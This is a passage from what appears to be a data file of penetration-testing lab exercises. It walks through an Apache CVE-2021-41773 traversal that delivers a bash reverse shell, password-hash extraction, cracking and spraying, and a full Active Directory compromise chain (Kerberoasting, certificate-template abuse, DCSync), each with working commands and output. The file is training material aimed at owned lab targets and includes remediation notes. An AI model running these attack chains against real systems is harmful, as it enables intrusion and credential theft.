    { t:'Start the listener before the payload', why:'The most common rookie mistake is a payload that connects to a listener that does not exist yet — and an obvious 60-second window to fix it.', cmd:`# Terminal 1 — start this FIRST, and keep it in tmux:
nc -lvnp 443
# Or with rlwrap for a usable line editor:
rlwrap -cAr nc -lvnp 443`, out:'listening on [any] 443 ...' },
    { t:'Escalate from file read to execution on the lab target', why:'The same traversal becomes code execution if the server has mod-cgi enabled; if it does not, use a different primitive. Adapt, do not force.', cmd:`# Only against a target you own:
#   1. confirm cgi-bin is executable
curl -s -o /dev/null -w '%{http_code}\\n' "http://192.168.56.30/cgi-bin/printenv"
#   2. deliver and trigger the payload (tmux + nc in the other pane)
bash -c 'echo "bash -i >& /dev/tcp/192.168.56.10/443 0>&1" | curl -s --path-as-is -X POST --data-binary @- "http://192.168.56.30/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"'; echo`, out:'uid=33(www-data) gid=33(www-data) groups=33(www-data)' },
    { t:'Upgrade the dumb shell to a TTY', why:'A dumb shell cannot run sudo, ssh or interactive tools. Getting a real TTY is not cosmetic, it is the difference between half the post-exploitation toolset working and none of it.', cmd:`python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z
stty raw -echo; fg
export TERM=xterm-256color; export SHELL=/bin/bash
stty rows $(tput lines) cols $(tput cols)
# Verify: tab completion, arrow keys, and this works:
sudo -l`, out:'bind: this is the first command' },
    { t:'Orient on the box in the first 60 seconds', why:'Every box looks the same for the first minute. Run the same six commands and you will always know where you stand.', cmd:`id; whoami; hostname; uname -a
cat /etc/os-release | head -3
sudo -l 2>&1 | head -20
find / -perm -4000 -type f 2>/dev/null | head -20
ls -la /home /opt /var/www 2>/dev/null`, out:'uid=33(www-data) — no sudo, one unusual SUID binary' },
    { t:'Clean up and log the path', why:'An engagement where you left a shell behind is an engagement with a permanent backdoor in the client\'s network. Track and remove.', cmd:`# Record what you did, then remove artefacts:
cat > exploit-log.md <<'EOF'
- t0  nmap -sV -> Apache 2.4.49 on 192.168.56.30:80
- t0  curl --path-as-is traversal -> /etc/passwd readable (proof of CVE-2021-41773)
- t1  payload dropped via cgi-bin -> shell as www-data (pid 4412)
- t1  upgraded with python3 pty.spawn; TERM=xterm-256color
- artefacts: /tmp/.x (remove), listener on 443 (close), history disabled
EOF
wc -l exploit-log.md`, out:'6 exploit-log.md' }
  ],
  verify:[
    'You can state the exact vulnerable version and the CVE',
    'You have a single-command proof of the vulnerability (curl request plus its output)',
    'You have an interactive shell with working tab completion and a corrected TERM',
    'exploit-log.md lists every artefact you created and how you removed it'
  ],
  pitfalls:[
    'Running an exploit you have not read. Payloads inside Exploit-DB submissions have been tampered with before.',
    'Starting the payload before the listener.',
    'Leaving the shell, the uploaded payload and the listener in place at the end of the lab. Cleaning up is the habit; the report depends on it.'
  ],
  hint:'When a public exploit fails, do not keep hammering it: check the prerequisite (is mod-cgi loaded? is the file writable? is the port filtered?), then switch primitive. Re-read versions and errors — the answer is nearly always there.',
  tools:['t-searchsploit','t-metasploit','t-msfvenom','t-nc','t-socat'] },

{ id:'lab-passwords', title:'Hash extraction, cracking and spraying', mod:'m07', diff:'med', os:'any', time:'75 min', xp:100,
  goal:'Extract hashes from a target you own, identify them, crack them efficiently, and attack live services without locking anyone out.',
  scenario:'Two halves of the same skill. Offline: you have a file of hashes and a GPU. Online: you have a service and a policy that punishes carelessness. Do both correctly and in the right order.',
  requires:['Your lab Linux VM (for /etc/shadow) and Windows VM (for NTLM)','hashcat, john, hydra, netexec, hashid'],
  steps:[
    { t:'Extract local hashes on your lab Linux box', why:'unshadow combines the two files into exactly the format john wants. Always work on copies.', cmd:`sudo cp /etc/passwd /etc/shadow ~/lab/pw/
sudo unshadow ~/lab/pw/passwd ~/lab/pw/shadow > ~/lab/pw/linux.hash
head -2 ~/lab/pw/linux.hash`, out:'root:$6$rAnDoMsAlT$...:0:0:root:/root:/bin/bash' },
    { t:'Identify the algorithm before you point a cracker at it', why:'Ten seconds here saves hours of a failed run against the wrong -m value.', cmd:`hashid -m '$6$rAnDoMsAlT$xxxxxxxx'`, out:'[+] SHA-512 Crypt\n[+] Hashcat Mode: 1800' },
    { t:'Crack with the right strategy', why:'Wordlist, then rules, then mask. Rules multiply a small list into millions of realistic candidates; masks exploit what you know about the password policy.', cmd:`hashcat -m 1800 ~/lab/pw/linux.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --status --status-timer 10 -O
hashcat -m 1800 ~/lab/pw/linux.hash --show | wc -l`, out:'Session..........: hashcat\nRecovered........: 2/4 (50.00%)' },
    { t:'Attack what you actually know', why:'If the policy demands 12 characters with a trailing digit, a mask is thousands of times faster than any public wordlist.', cmd:`hashcat -m 1800 ~/lab/pw/linux.hash -a 3 '?u?l?l?l?l?l?l?l?d?d' --increment --increment-min 8 -O`, out:'Recovered........: 3/4 (75.00%)' },
    { t:'Extract NTLM from your lab Windows host', why:'The Windows side of the same skill: remote extraction with no binary on the target.', cmd:`nxc smb 192.168.56.20 -u alice -p 'Password1' --sam
nxc smb 192.168.56.20 -u alice -p 'Password1' --lsa
# Save the hashes into a file in user:rid:lm:nt::: format, then:
awk -F: '{print $4}' ntlm.dump | grep -E '^[0-9a-f]{32}$' > ntlm.txt
hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule --status`, out:'aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:Password1' },
    { t:'Read the policy before going online', why:'This is the professional boundary. Know the threshold or do not attack.', cmd:`nxc smb 192.168.56.20 -u alice -p 'Password1' --pass-pol`, out:'Account Lockout Threshold: 5\nReset Account Lockout Counter After: 30 minutes' },
    { t:'Spray, do not brute force', why:'One weak password across 300 accounts beats 300 passwords against one account — and it produces 300 events instead of 90,000.', cmd:`# With a threshold of 5: 1 password, all users, single-threaded, deliberate
nxc smb 192.168.56.20 -u users.txt -p 'Summer2026!' --continue-on-success --no-bruteforce -t 1 | tee spray.txt
grep -c '\\[+\\]' spray.txt`, out:'[+] LAB\\bob:Summer2026!' },
    { t:'Log the outcome properly', why:'Cracked and sprayed credentials are the most sensitive thing you will hold. They need a tally and a rotation instruction in the report.', cmd:`cat > password-findings.md <<'EOF'
## Credential security
- 3 of 4 local Linux accounts cracked from /etc/shadow in under 4 minutes
  (wordlist + best64 rules; 1 via mask against the documented policy)
- Password policy on WIN-TARGET: min length 7, NO lockout threshold, no complexity
- Spray of 1 password against 12 accounts -> 1 valid (bob:Summer2026!)
- Root cause: policy permits dictionary words with a capital and a trailing digit
- Remediation: minimum 14 chars, lockout 5/30min, ban common-password lists,
  deploy a passphrase-based policy and MFA; rotate every credential listed above
EOF
wc -l password-findings.md`, out:'8 password-findings.md' }
  ],
  verify:[
    'You identified the hash format with hashid and used the matching hashcat -m value',
    'You cracked at least one hash with rules and at least one with a mask',
    'You can state the target password policy from live enumeration',
    'password-findings.md lists every recovered credential with a rotation instruction'
  ],
  pitfalls:[
    'Cracking without identification and burning an hour on the wrong mode.',
    'Running hydra with default 16 threads against a corporate domain controller. That is a self-inflicted denial of service.',
    'Storing recovered passwords in your shell history or in plaintext in a notes app.'
  ],
  hint:'The potfile is cumulative and automatic. Run hashcat --show before every session so you do not reprocess what you already cracked, and use -r rules almost always: rules are the highest value-per-second technique in password recovery.',
  tools:['t-hashcat','t-john','t-hashid','t-hydra','t-netexec'] },

{ id:'lab-ad', title:'Active Directory: from user to domain admin', mod:'m08', diff:'hard', os:'kali→windows', time:'120 min', xp:140,
  goal:'Walk a complete AD attack chain on your own lab domain: enumerate, escalate, move laterally, and take the domain.',
  scenario:'You own a lab domain — a Windows Server DC plus one workstation, or a purpose-built vulnerable AD lab. You have one low-privilege domain user. Everything from here is a path, and the path should be found in a graph, not guessed.',
  requires:['A lab AD environment (Windows Server evaluation + a Windows 10 VM, or an AD lab range)','netexec, bloodhound + bloodhound-python, impacket, certipy, responding DNS configured'],
  steps:[
    { t:'Fix DNS first or nothing will work', why:'AD is DNS-driven. Point your attacker at the DC as nameserver and use the FQDN, not the IP, for Kerberos to work.', cmd:`sudo resolvectl dns eth0 192.168.56.20
echo 'nameserver 192.168.56.20' | sudo tee /etc/resolv.conf
dig +short lab.local A && dig +short -x 192.168.56.20`, out:'192.168.56.20\ndc01.lab.local.' },
    { t:'Validate the credential, then enumerate breadth-first', why:'One command gives users, groups, shares, policies and the domain password policy. Do this before anything clever.', cmd:`nxc smb 192.168.56.20 -u 'lab.local\\alice' -p 'Password1' --pass-pol
nxc smb 192.168.56.20 -u alice -p 'Password1' --users | tee users.txt
nxc smb 192.168.56.20 -u alice -p 'Password1' --groups
nxc ldap 192.168.56.20 -u alice -p 'Password1' --trusted-for-delegation`, out:'LAB.LOCAL\\alice:Password1 (Pwn3d!)' },
    { t:'Collect the graph and read it', why:'BloodHound turns "I have a user account" into a specific four-step plan. Mark your foothold as Owned, then ask for the shortest path.', cmd:`bloodhound-python -u alice -p 'Password1' -d lab.local -ns 192.168.56.20 -c All --zip
# Upload the zip, mark ALICE@LAB.LOCAL as Owned, then:
#   Analysis > "Shortest Paths to Domain Admins"
# Note the edges: which object sits between you and DA?`, out:'ZIP written: 20261024120000_bloodhound.zip' },
    { t:'Try the two cheapest AD wins first', why:'AS-REP roasting and Kerberoasting convert "any domain user" into crackable hashes with no exploitation at all. They should be the first two commands you run on every domain.', cmd:`impacket-GetNPUsers lab.local/alice:'Password1' -dc-ip 192.168.56.20 -request -outputfile asrep.txt
impacket-GetUserSPNs lab.local/alice:'Password1' -dc-ip 192.168.56.20 -request -outputfile kerb.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --status
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt --status`, out:'$krb5asrep$23$svc_sql@LAB.LOCAL:...\nRecovered........: 1/1' },
    { t:'Check AD CS — the modern intended path', why:'If a certificate authority is deployed and a template is misconfigured, one ordinary domain user becomes a domain admin. Run this on every AD engagement.', cmd:`certipy-ad find -u alice@lab.local -p 'Password1' -dc-ip 192.168.56.20 -vulnerable -stdout | tee certipy.txt
grep -iE 'ESC[0-9]+|Template Name|Vulnerable' certipy.txt | head -20`, out:'Template Name : VulnTemplate\n[!] Vulnerabilities : ESC1: Enrollee Supplies Subject' },
    { t:'Exploit the path the graph gave you', why:'Whichever edge BloodHound showed: if it is ACL-based, use the ACL; if it is a certificate template, use certipy; if it is a session, target that host.', cmd:`# ESC1 chain (lab only):
certipy-ad req -u alice@lab.local -p 'Password1' -ca 'LAB-CA' -template 'VulnTemplate' \\
  -upn administrator@lab.local -dc-ip 192.168.56.20
certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.56.20`, out:'[*] Got TGT\n[*] Got hash for administrator@lab.local: aad3b435b...:8846f7ea...' },
    { t:'Move laterally the quiet way', why:'Choose the execution mechanism deliberately. The detection ladder runs wmiexec (quietest) to psexec (loudest).', cmd:`impacket-wmiexec lab.local/administrator:'P@ss'@192.168.56.30 'hostname && whoami'
# Or an interactive session with less noise than psexec:
evil-winrm -i 192.168.56.30 -u administrator -p 'P@ss'`, out:'WIN10\nlab\\administrator' },
    { t:'Take the domain and document the chain', why:'DCSync is the endpoint. Then write the path, because "we got DA" is worthless to a client — they need the exact four edges to remove.', cmd:`impacket-secretsdump -just-dc-ntlm lab.local/administrator:'P@ss'@192.168.56.20 | tee dcsync.txt
grep -E 'Administrator:500' dcsync.txt
cat > ad-chain.md <<'EOF'
# AD attack chain — lab.local
1. alice:Password1 (foothold from initial password audit)
2. AS-REP roast svc_sql (no preauth set) -> cracked: SqlSvc2024
3. BloodHound: svc_sql has GenericWrite over OU=Helpdesk
4. certipy find -> VulnTemplate ESC1 (enrollee supplies subject)
5. ESC1 request with UPN=administrator -> TGT + NT hash
6. DCSync -> krbtgt + all domain hashes
## Fix order
- Set Kerberos preauth on all accounts (class 2)
- Remove GenericWrite from svc_sql (class 3)
- Fix the template: disable "Enrollee supplies subject", require manager approval (class 4)
- Rotate krbtgt twice (class 1 - assume full compromise)
EOF
wc -l ad-chain.md`, out:'12 ad-chain.md' }
  ],
  verify:[
    'Kerberos works: impacket tools authenticate with the FQDN and the DC as nameserver',
    'You have a BloodHound graph and can name the specific edges between your foothold and Domain Admins',
    'You cracked at least one AS-REP or Kerberoast hash',
    'ad-chain.md lists the exact steps plus a fix order that maps to the client\'s remediation'
  ],
  pitfalls:[
    'Skipping the DNS step, then blaming the tools. Most "impacket does not work" problems are resolv.conf.',
    'SharpHound -c All on a monitored estate on your first collection. Start with -c DCOnly.',
    'Extracting krbtgt and not telling the client immediately. That is a full-domain-compromise event requiring a double krbtgt rotation.'
  ],
  hint:'If BloodHound shows no path, the interactive queries are the answer, not the automated ones: "Shortest Path from Owned Principals", "Principals with DCSync Rights", "Users with Foreign Domain Group Membership". The automated shortest path assumes you collected sessions, and sessions are transient.',
  tools:['t-netexec','t-bloodhound','t-impacket','t-certipy','t-evilwinrm'] }

];
